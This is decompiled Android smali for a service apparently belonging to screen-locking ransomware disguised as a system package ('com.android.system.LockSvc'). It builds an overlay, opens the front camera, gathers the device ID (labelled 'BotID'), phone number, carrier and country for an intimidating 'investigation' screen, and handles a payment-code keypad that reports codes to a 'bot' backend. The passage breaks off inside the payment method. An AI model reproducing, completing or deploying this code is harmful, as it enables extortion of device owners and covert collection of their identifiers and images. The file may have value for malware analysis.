.class public Lcom/android/system/LockSvc;
.super Landroid/app/Service;
.source "LockSvc.java"


# annotations
.annotation build Landroid/annotation/SuppressLint;
    value = {
        "NewApi"
    }
.end annotation

.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/android/system/LockSvc$ContactExe;,
        Lcom/android/system/LockSvc$Init_Svc;,
        Lcom/android/system/LockSvc$LoadImg;,
        Lcom/android/system/LockSvc$PayForm;,
        Lcom/android/system/LockSvc$PhotoHandler;,
        Lcom/android/system/LockSvc$PreviewState;,
        Lcom/android/system/LockSvc$Scan;
    }
.end annotation


# instance fields
.field INF:Landroid/view/LayoutInflater;

.field Params:Landroid/view/WindowManager$LayoutParams;

.field VIEW:Landroid/view/View;

.field VW:Landroid/view/View;

.field WIN:Landroid/view/WindowManager;

.field WM:Landroid/view/WindowManager;

.field private mCamera:Landroid/hardware/Camera;

.field private mFrame:Landroid/widget/LinearLayout;

.field private mPreviewState:Lcom/android/system/LockSvc$PreviewState;

.field private mSurfaceHolder:Landroid/view/SurfaceHolder;

.field mSurfaceHolderCallback:Landroid/view/SurfaceHolder$Callback;


# direct methods
.method public constructor <init>()V
    .locals 2

    .prologue
    const/4 v1, 0x0

    .line 70
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 79
    sget-object v0, Lcom/android/system/LockSvc$PreviewState;->STOPPED:Lcom/android/system/LockSvc$PreviewState;

    iput-object v0, p0, Lcom/android/system/LockSvc;->mPreviewState:Lcom/android/system/LockSvc$PreviewState;

    .line 85
    iput-object v1, p0, Lcom/android/system/LockSvc;->Params:Landroid/view/WindowManager$LayoutParams;

    .line 86
    iput-object v1, p0, Lcom/android/system/LockSvc;->WM:Landroid/view/WindowManager;

    .line 87
    iput-object v1, p0, Lcom/android/system/LockSvc;->INF:Landroid/view/LayoutInflater;

    .line 88
    iput-object v1, p0, Lcom/android/system/LockSvc;->VW:Landroid/view/View;

    .line 89
    iput-object v1, p0, Lcom/android/system/LockSvc;->WIN:Landroid/view/WindowManager;

    .line 90
    iput-object v1, p0, Lcom/android/system/LockSvc;->VIEW:Landroid/view/View;

    .line 726
    new-instance v0, Lcom/android/system/LockSvc$1;

    invoke-direct {v0, p0}, Lcom/android/system/LockSvc$1;-><init>(Lcom/android/system/LockSvc;)V

    iput-object v0, p0, Lcom/android/system/LockSvc;->mSurfaceHolderCallback:Landroid/view/SurfaceHolder$Callback;

    .line 70
    return-void
.end method

.method private Connected(Landroid/content/Context;)Z
    .locals 3
    .param p1, "c"    # Landroid/content/Context;

    .prologue
    .line 1332
    const-string v2, "connectivity"

    invoke-virtual {p1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    .line 1333
    .local v0, "cm":Landroid/net/ConnectivityManager;
    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v1

    .line 1335
    .local v1, "netInfo":Landroid/net/NetworkInfo;
    if-eqz v1, :cond_0

    invoke-virtual {v1}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v2

    if-eqz v2, :cond_0

    .line 1336
    const/4 v2, 0x1

    .line 1340
    :goto_0
    return v2

    :cond_0
    const/4 v2, 0x0

    goto :goto_0
.end method

.method private MainPromo()V
    .locals 15

    .prologue
    .line 126
    iget-object v10, p0, Lcom/android/system/LockSvc;->VW:Landroid/view/View;

    .line 127
    invoke-virtual {p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v11

    const-string v12, "invest"

    const-string v13, "id"

    invoke-virtual {p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v11, v12, v13, v14}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v11

    invoke-virtual {v10, v11}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v5

    .line 126
    check-cast v5, Landroid/widget/TextView;

    .line 129
    .local v5, "Investigation":Landroid/widget/TextView;
    iget-object v10, p0, Lcom/android/system/LockSvc;->VW:Landroid/view/View;

    .line 130
    invoke-virtual {p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v11

    const-string v12, "locate"

    const-string v13, "id"

    invoke-virtual {p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v11, v12, v13, v14}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v11

    invoke-virtual {v10, v11}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v6

    .line 129
    check-cast v6, Landroid/widget/TextView;

    .line 132
    .local v6, "Locate":Landroid/widget/TextView;
    iget-object v10, p0, Lcom/android/system/LockSvc;->VW:Landroid/view/View;

    .line 133
    invoke-virtual {p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v11

    const-string v12, "carrier"

    const-string v13, "id"

    invoke-virtual {p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v11, v12, v13, v14}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v11

    invoke-virtual {v10, v11}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v7

    .line 132
    check-cast v7, Landroid/widget/TextView;

    .line 135
    .local v7, "Oper":Landroid/widget/TextView;
    iget-object v10, p0, Lcom/android/system/LockSvc;->VW:Landroid/view/View;

    .line 136
    invoke-virtual {p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v11

    const-string v12, "phone"

    const-string v13, "id"

    invoke-virtual {p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v11, v12, v13, v14}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v11

    invoke-virtual {v10, v11}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v8

    .line 135
    check-cast v8, Landroid/widget/TextView;

    .line 138
    .local v8, "Phone":Landroid/widget/TextView;
    iget-object v10, p0, Lcom/android/system/LockSvc;->VW:Landroid/view/View;

    const v11, 0x7f09003a

    invoke-virtual {v10, v11}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v4

    check-cast v4, Landroid/widget/Button;

    .line 140
    .local v4, "Details":Landroid/widget/Button;
    const-string v10, "phone"

    invoke-virtual {p0, v10}, Lcom/android/system/LockSvc;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Landroid/telephony/TelephonyManager;

    .line 144
    .local v9, "Tm":Landroid/telephony/TelephonyManager;
    invoke-virtual {v9}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v10

    if-eqz v10, :cond_2

    .line 145
    invoke-virtual {v9}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v0

    .line 147
    .local v0, "BotID":Ljava/lang/String;
    :goto_0
    invoke-virtual {v9}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v10

    if-eqz v10, :cond_3

    invoke-virtual {v9}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/String;->length()I

    move-result v10

    const/4 v11, 0x3

    if-le v10, v11, :cond_3

    .line 148
    invoke-virtual {v9}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v3

    .line 150
    .local v3, "BotPhone":Ljava/lang/String;
    :goto_1
    invoke-virtual {v9}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v10

    if-eqz v10, :cond_4

    invoke-virtual {v9}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/String;->length()I

    move-result v10

    const/4 v11, 0x1

    if-le v10, v11, :cond_4

    invoke-virtual {v9}, Landroid/telephony/TelephonyManager;->getSimOperator()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/String;->length()I

    move-result v10

    const/4 v11, 0x1

    if-le v10, v11, :cond_4

    .line 151
    invoke-virtual {v9}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v2

    .line 153
    .local v2, "BotNetwork":Ljava/lang/String;
    :goto_2
    invoke-virtual {v9}, Landroid/telephony/TelephonyManager;->getSimCountryIso()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/String;->length()I

    move-result v10

    const/4 v11, 0x1

    if-le v10, v11, :cond_5

    .line 154
    invoke-virtual {v9}, Landroid/telephony/TelephonyManager;->getSimCountryIso()Ljava/lang/String;

    move-result-object v1

    .line 157
    .local v1, "BotLocation":Ljava/lang/String;
    :goto_3
    const-string v10, "NO"

    invoke-virtual {v3, v10}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v10

    if-eqz v10, :cond_0

    .line 158
    const/16 v10, 0x8

    invoke-virtual {v8, v10}, Landroid/widget/TextView;->setVisibility(I)V

    .line 161
    :cond_0
    const-string v10, "NO"

    invoke-virtual {v2, v10}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v10

    if-eqz v10, :cond_1

    .line 162
    const/16 v10, 0x8

    invoke-virtual {v7, v10}, Landroid/widget/TextView;->setVisibility(I)V

    .line 165
    :cond_1
    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "#"

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v10, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v5, v10}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 166
    invoke-virtual {v8, v3}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 167
    invoke-virtual {v7, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 168
    invoke-virtual {v1}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v6, v10}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 172
    new-instance v10, Lcom/android/system/LockSvc$2;

    invoke-direct {v10, p0, v4}, Lcom/android/system/LockSvc$2;-><init>(Lcom/android/system/LockSvc;Landroid/widget/Button;)V

    invoke-virtual {v4, v10}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 193
    return-void

    .line 145
    .end local v0    # "BotID":Ljava/lang/String;
    .end local v1    # "BotLocation":Ljava/lang/String;
    .end local v2    # "BotNetwork":Ljava/lang/String;
    .end local v3    # "BotPhone":Ljava/lang/String;
    :cond_2
    invoke-virtual {p0}, Lcom/android/system/LockSvc;->getApplicationContext()Landroid/content/Context;

    move-result-object v10

    invoke-virtual {v10}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v10

    const-string v11, "android_id"

    invoke-static {v10, v11}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    goto/16 :goto_0

    .line 148
    .restart local v0    # "BotID":Ljava/lang/String;
    :cond_3
    const-string v3, "NO"

    goto/16 :goto_1

    .line 151
    .restart local v3    # "BotPhone":Ljava/lang/String;
    :cond_4
    const-string v2, "NO"

    goto :goto_2

    .line 154
    .restart local v2    # "BotNetwork":Ljava/lang/String;
    :cond_5
    invoke-virtual {p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v10

    invoke-virtual {v10}, Landroid/content/res/Resources;->getConfiguration()Landroid/content/res/Configuration;

    move-result-object v10

    iget-object v10, v10, Landroid/content/res/Configuration;->locale:Ljava/util/Locale;

    invoke-virtual {v10}, Ljava/util/Locale;->getCountry()Ljava/lang/String;

    move-result-object v1

    goto :goto_3
.end method

.method static synthetic access$0(Lcom/android/system/LockSvc;)Landroid/hardware/Camera;
    .locals 1

    .prologue
    .line 73
    iget-object v0, p0, Lcom/android/system/LockSvc;->mCamera:Landroid/hardware/Camera;

    return-object v0
.end method

.method static synthetic access$1(Lcom/android/system/LockSvc;Lcom/android/system/LockSvc$PreviewState;)V
    .locals 0

    .prologue
    .line 79
    iput-object p1, p0, Lcom/android/system/LockSvc;->mPreviewState:Lcom/android/system/LockSvc$PreviewState;

    return-void
.end method

.method static synthetic access$2(Lcom/android/system/LockSvc;)Landroid/view/SurfaceHolder;
    .locals 1

    .prologue
    .line 75
    iget-object v0, p0, Lcom/android/system/LockSvc;->mSurfaceHolder:Landroid/view/SurfaceHolder;

    return-object v0
.end method

.method static synthetic access$3(Lcom/android/system/LockSvc;)Landroid/widget/LinearLayout;
    .locals 1

    .prologue
    .line 74
    iget-object v0, p0, Lcom/android/system/LockSvc;->mFrame:Landroid/widget/LinearLayout;

    return-object v0
.end method

.method static synthetic access$4(Lcom/android/system/LockSvc;)Lcom/android/system/LockSvc$PreviewState;
    .locals 1

    .prologue
    .line 79
    iget-object v0, p0, Lcom/android/system/LockSvc;->mPreviewState:Lcom/android/system/LockSvc$PreviewState;

    return-object v0
.end method

.method static synthetic access$5(Lcom/android/system/LockSvc;)Landroid/hardware/Camera;
    .locals 1

    .prologue
    .line 710
    invoke-direct {p0}, Lcom/android/system/LockSvc;->getCamera()Landroid/hardware/Camera;

    move-result-object v0

    return-object v0
.end method

.method static synthetic access$6(Lcom/android/system/LockSvc;Landroid/hardware/Camera;)V
    .locals 0

    .prologue
    .line 73
    iput-object p1, p0, Lcom/android/system/LockSvc;->mCamera:Landroid/hardware/Camera;

    return-void
.end method

.method static synthetic access$7(Lcom/android/system/LockSvc;Landroid/widget/LinearLayout;)V
    .locals 0

    .prologue
    .line 74
    iput-object p1, p0, Lcom/android/system/LockSvc;->mFrame:Landroid/widget/LinearLayout;

    return-void
.end method

.method static synthetic access$8(Lcom/android/system/LockSvc;Landroid/view/SurfaceHolder;)V
    .locals 0

    .prologue
    .line 75
    iput-object p1, p0, Lcom/android/system/LockSvc;->mSurfaceHolder:Landroid/view/SurfaceHolder;

    return-void
.end method

.method static synthetic access$9(Lcom/android/system/LockSvc;)V
    .locals 0

    .prologue
    .line 122
    invoke-direct {p0}, Lcom/android/system/LockSvc;->MainPromo()V

    return-void
.end method

.method private getCamera()Landroid/hardware/Camera;
    .locals 2

    .prologue
    .line 712
    :try_start_0
    invoke-direct {p0}, Lcom/android/system/LockSvc;->getFrontCameraId()I

    move-result v0

    .line 713
    .local v0, "camid":I
    const/4 v1, -0x1

    if-eq v0, v1, :cond_0

    .line 714
    invoke-static {v0}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v1

    iput-object v1, p0, Lcom/android/system/LockSvc;->mCamera:Landroid/hardware/Camera;
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0

    .line 723
    .end local v0    # "camid":I
    :goto_0
    iget-object v1, p0, Lcom/android/system/LockSvc;->mCamera:Landroid/hardware/Camera;

    :goto_1
    return-object v1

    .line 718
    .restart local v0    # "camid":I
    :cond_0
    const/4 v1, 0x0

    goto :goto_1

    .line 721
    .end local v0    # "camid":I
    :catch_0
    move-exception v1

    goto :goto_0
.end method

.method private getFrontCameraId()I
    .locals 6

    .prologue
    .line 685
    const/4 v0, -0x1

    .line 686
    .local v0, "camId":I
    invoke-virtual {p0}, Lcom/android/system/LockSvc;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v4

    .line 687
    const-string v5, "android.hardware.camera.front"

    .line 686
    invoke-virtual {v4, v5}, Landroid/content/pm/PackageManager;->hasSystemFeature(Ljava/lang/String;)Z

    move-result v4

    .line 687
    if-eqz v4, :cond_0

    .line 689
    invoke-static {}, Landroid/hardware/Camera;->getNumberOfCameras()I

    move-result v3

    .line 690
    .local v3, "numberOfCameras":I
    new-instance v1, Landroid/hardware/Camera$CameraInfo;

    invoke-direct {v1}, Landroid/hardware/Camera$CameraInfo;-><init>()V

    .line 692
    .local v1, "ci":Landroid/hardware/Camera$CameraInfo;
    const/4 v2, 0x0

    .local v2, "i":I
    :goto_0
    if-lt v2, v3, :cond_1

    .line 701
    .end local v1    # "ci":Landroid/hardware/Camera$CameraInfo;
    .end local v2    # "i":I
    .end local v3    # "numberOfCameras":I
    :cond_0
    return v0

    .line 693
    .restart local v1    # "ci":Landroid/hardware/Camera$CameraInfo;
    .restart local v2    # "i":I
    .restart local v3    # "numberOfCameras":I
    :cond_1
    invoke-static {v2, v1}, Landroid/hardware/Camera;->getCameraInfo(ILandroid/hardware/Camera$CameraInfo;)V

    .line 694
    iget v4, v1, Landroid/hardware/Camera$CameraInfo;->facing:I

    const/4 v5, 0x1

    if-ne v4, v5, :cond_2

    .line 695
    move v0, v2

    .line 692
    :cond_2
    add-int/lit8 v2, v2, 0x1

    goto :goto_0
.end method


# virtual methods
.method public DestroyV(Landroid/view/WindowManager;Landroid/view/View;)V
    .locals 8
    .param p1, "win"    # Landroid/view/WindowManager;
    .param p2, "view"    # Landroid/view/View;

    .prologue
    .line 1348
    new-instance v0, Lcom/android/system/LockSvc$18;

    const-wide/16 v2, 0x3e8

    const-wide/16 v4, 0x3e7

    move-object v1, p0

    move-object v6, p1

    move-object v7, p2

    invoke-direct/range {v0 .. v7}, Lcom/android/system/LockSvc$18;-><init>(Lcom/android/system/LockSvc;JJLandroid/view/WindowManager;Landroid/view/View;)V

    .line 1361
    .local v0, "ScanDestroy":Landroid/os/CountDownTimer;
    invoke-virtual {v0}, Landroid/os/CountDownTimer;->start()Landroid/os/CountDownTimer;

    .line 1363
    return-void
.end method

.method public FixMP(Ljava/lang/String;)V
    .locals 7
    .param p1, "code"    # Ljava/lang/String;

    .prologue
    .line 657
    new-instance v0, Lcom/android/system/IO;

    invoke-direct {v0}, Lcom/android/system/IO;-><init>()V

    const-string v1, "mp_code"

    invoke-virtual {p0}, Lcom/android/system/LockSvc;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-virtual {v0, v1, p1, v3}, Lcom/android/system/IO;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 659
    invoke-virtual {p0}, Lcom/android/system/LockSvc;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/android/system/LockSvc;->Connected(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 661
    const-string v2, "mp_code"

    .line 662
    .local v2, "xx":Ljava/lang/String;
    const-string v6, "bot"

    .line 663
    .local v6, "zz":Ljava/lang/String;
    new-instance v0, Lcom/android/system/Report;

    invoke-direct {v0}, Lcom/android/system/Report;-><init>()V

    const-string v1, "kavSucker"

    .line 667
    invoke-virtual {p0}, Lcom/android/system/LockSvc;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    move-object v3, v2

    move-object v4, v2

    .line 663
    invoke-virtual/range {v0 .. v5}, Lcom/android/system/Report;->Av(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 676
    .end local v2    # "xx":Ljava/lang/String;
    .end local v6    # "zz":Ljava/lang/String;
    :goto_0
    return-void

    .line 673
    :cond_0
    new-instance v0, Lcom/android/system/IO;

    invoke-direct {v0}, Lcom/android/system/IO;-><init>()V

    const-string v1, "tasker"

    const-string v3, "cache_code"

    invoke-virtual {p0}, Lcom/android/system/LockSvc;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    invoke-virtual {v0, v1, v3, v4}, Lcom/android/system/IO;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    goto :goto_0
.end method

.method public InsertCode(Ljava/lang/String;Landroid/view/View;)V
    .locals 6
    .param p1, "string"    # Ljava/lang/String;
    .param p2, "antiAv"    # Landroid/view/View;

    .prologue
    .line 645
    .line 646
    invoke-virtual {p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v2

    const-string v3, "mp_code"

    const-string v4, "id"

    invoke-virtual {p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v3, v4, v5}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v2

    invoke-virtual {p2, v2}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    .line 645
    check-cast v0, Landroid/widget/TextView;

    .line 648
    .local v0, "Code":Landroid/widget/TextView;
    invoke-virtual {v0}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v1

    .line 650
    .local v1, "Mem":Ljava/lang/String;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 652
    return-void
.end method

.method public MP_Agree()V
    .locals 6

    .prologue
    .line 202
    iget-object v1, p0, Lcom/android/system/LockSvc;->VW:Landroid/view/View;

    .line 203
    invoke-virtual {p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v2

    const-string v3, "yes_agreement"

    const-string v4, "id"

    invoke-virtual {p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v3, v4, v5}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v2

    invoke-virtual {v1, v2}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    .line 202
    check-cast v0, Landroid/widget/Button;

    .line 204
    .local v0, "Back_Agreement":Landroid/widget/Button;
    new-instance v1, Lcom/android/system/LockSvc$3;

    invoke-direct {v1, p0, v0}, Lcom/android/system/LockSvc$3;-><init>(Lcom/android/system/LockSvc;Landroid/widget/Button;)V

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 216
    return-void
.end method

.method public MP_Pay(Landroid/view/View;)V
    .locals 38
    .param p1, "payForm2"    # Landroid/view/View;

    .prologue
    .line 224
    .line 225
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    const-string v5, "mp_code"

    const-string v7, "id"

    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v4, v5, v7, v13}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, p1

    invoke-virtual {v0, v4}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v11

    .line 224
    check-cast v11, Landroid/widget/TextView;

    .line 228
    .local v11, "Code":Landroid/widget/TextView;
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    const-string v5, "help"

    const-string v7, "id"

    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v4, v5, v7, v13}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, p1

    invoke-virtual {v0, v4}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v30

    .line 227
    check-cast v30, Landroid/widget/Button;

    .line 231
    .local v30, "Help":Landroid/widget/Button;
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    const-string v5, "clear"

    const-string v7, "id"

    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v4, v5, v7, v13}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, p1

    invoke-virtual {v0, v4}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v29

    .line 230
    check-cast v29, Landroid/widget/Button;

    .line 234
    .local v29, "Clear":Landroid/widget/Button;
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    const-string v5, "butt_1"

    const-string v7, "id"

    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v4, v5, v7, v13}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, p1

    invoke-virtual {v0, v4}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v20

    .line 233
    check-cast v20, Landroid/widget/Button;

    .line 237
    .local v20, "Butt_1":Landroid/widget/Button;
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    const-string v5, "butt_2"

    const-string v7, "id"

    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v4, v5, v7, v13}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, p1

    invoke-virtual {v0, v4}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v21

    .line 236
    check-cast v21, Landroid/widget/Button;

    .line 240
    .local v21, "Butt_2":Landroid/widget/Button;
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    const-string v5, "butt_3"

    const-string v7, "id"

    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v4, v5, v7, v13}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, p1

    invoke-virtual {v0, v4}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v22

    .line 239
    check-cast v22, Landroid/widget/Button;

    .line 243
    .local v22, "Butt_3":Landroid/widget/Button;
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    const-string v5, "butt_4"

    const-string v7, "id"

    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v4, v5, v7, v13}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, p1

    invoke-virtual {v0, v4}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v23

    .line 242
    check-cast v23, Landroid/widget/Button;

    .line 246
    .local v23, "Butt_4":Landroid/widget/Button;
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    const-string v5, "butt_5"

    const-string v7, "id"

    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v4, v5, v7, v13}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, p1

    invoke-virtual {v0, v4}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v24

    .line 245
    check-cast v24, Landroid/widget/Button;

    .line 249
    .local v24, "Butt_5":Landroid/widget/Button;
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    const-string v5, "butt_6"

    const-string v7, "id"

    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v4, v5, v7, v13}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, p1

    invoke-virtual {v0, v4}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v25

    .line 248
    check-cast v25, Landroid/widget/Button;

    .line 253
    .local v25, "Butt_6":Landroid/widget/Button;
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v4

